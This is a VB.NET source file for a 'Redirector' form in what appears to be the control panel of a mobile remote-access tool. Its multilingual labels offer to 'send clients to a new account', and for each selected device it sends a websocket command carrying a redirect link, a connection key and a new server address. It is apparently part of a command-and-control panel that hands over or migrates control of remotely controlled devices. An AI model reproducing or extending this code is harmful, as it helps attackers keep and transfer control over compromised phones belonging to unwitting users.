Imports System.Security.AccessControl
Imports System.Windows.Input

Public Class Redirector
    Public listclients As New List(Of BTClient)
    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")


            Case "AR"
                    mytitle.Text = "إرسال العملاء إلى حساب جديد"
                    titmsg1.Text = "رابط إعادة التوجيه (حساب جديد)"
                titmsg2.Text = "عنوان الخادم"
                titlemsg3.Text = "مفتاح الاتصال" 'connection key
                whtbtn.Text = "ما هذا؟"
                confbtn.Text = "موافق"

                Exit Select

                Case "CN" ' Chinese
                    mytitle.Text = "将客户发送到新帐户"
                    titmsg1.Text = "重定向链接（新帐户）"
                    titmsg2.Text = "服务器地址"
                    whtbtn.Text = "这是什么？"
                confbtn.Text = "确认"
                titlemsg3.Text = "连接密钥"

                Exit Select

                Case "RU" ' Russian
                    mytitle.Text = "Отправить клиентов на новый аккаунт"
                    titmsg1.Text = "Ссылка перенаправления (новый аккаунт)"
                    titmsg2.Text = "Адрес сервера"
                    whtbtn.Text = "Что это?"
                confbtn.Text = "Подтвердить"
                titlemsg3.Text = "Ключ подключения"

                Exit Select

                Case "TR" ' Turkish
                    mytitle.Text = "Müşterileri yeni hesaba gönder"
                    titmsg1.Text = "Yönlendirme bağlantısı (yeni hesap)"
                    titmsg2.Text = "Sunucu adresi"
                    whtbtn.Text = "Bu nedir?"
                confbtn.Text = "Onayla"
                titlemsg3.Text = "Bağlantı anahtarı"

                Exit Select

                Case "SP" ' Spanish
                    mytitle.Text = "Enviar clientes a una nueva cuenta"
                    titmsg1.Text = "Enlace de redirección (nueva cuenta)"
                    titmsg2.Text = "Dirección del servidor"
                    whtbtn.Text = "¿Qué es esto?"
                confbtn.Text = "Confirmar"
                titlemsg3.Text = "Clave de conexión"

                Exit Select

                Case "PR" ' Brazilian Portuguese
                    mytitle.Text = "Enviar clientes para nova conta"
                    titmsg1.Text = "Link de redirecionamento (nova conta)"
                    titmsg2.Text = "Endereço do servidor"
                    whtbtn.Text = "O que é isso?"
                confbtn.Text = "Confirmar"
                titlemsg3.Text = "Chave de conexão"

                Exit Select



            End Select
    End Sub
    Private Sub Redirector_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.mytitle.Text = redirctstr
        SetDoubleBuffered(DGVC)
        For Each cli As BTClient In listclients
            Dim rowid As Integer = DGVC.Rows.Add(True, cli.wallpaper, cli.name)
            DGVC.Rows(rowid).Tag = cli.mobid
        Next
        Me.naddresstext.Text = DefServer
        conkey.Text = BTRegistry.GetValue(Regz.cokey, "")
    End Sub

    Private Sub DrakeUIButtonIcon5_Click(sender As Object, e As EventArgs) Handles whtbtn.Click
        MyMsg.Show(redirctstr, explnrestr, msgtype.Confirm, False)

    End Sub

    Private Sub sndbtn_Click(sender As Object, e As EventArgs) Handles confbtn.Click
        Dim sendto As String = nlinktext.Text
        Dim nip As String = naddresstext.Text
        Dim Nconkey As String = conkey.Text

        If isEmpty(sendto) Then
            MyMsg.Show(redrcterrstr, recplsstr, msgtype.warning, False)
            Return
        End If
        If isEmpty(Nconkey) Then
            MyMsg.Show(redrcterrstr, rednokstr, msgtype.warning, False)
            Return
        End If
        If isEmpty(nip) Then
            MyMsg.Show(redrcterrstr, recplsadstr, msgtype.warning, False)
            Return
        End If
        If sendto = BTEngine.share_link AndAlso naddresstext.Text = DefServer Then
            MyMsg.Show(redrcterrstr, redwarnstr, msgtype.warning, False)
            Return
        End If

        If MyMsg.Show(redirctstr, confredstr, msgtype.Confirm, True) <> DialogResult.OK Then
            Return
        End If

        For Each cli As DataGridViewRow In DGVC.Rows
            Try
                If cli.Cells(0).Value = True Then

                    Dim mobid As String = cli.Tag.ToString
                    Dim chatData As New Dictionary(Of String, Object) From {
                                {"msg", redirct},
                                {"relink", sendto},
                                {"rckey", Nconkey},
                                {"reip", nip}
                            }
                    BTEngine.commands(chatData, mobid, BTEngine.MainForm.webSocketClient)
                    Dim clasclient = BTEngine.GetClientById(mobid)

                    clasclient.startTime = DateTime.Now.AddSeconds(5)
                End If

            Catch ex As Exception

            End Try
        Next
    End Sub
End Class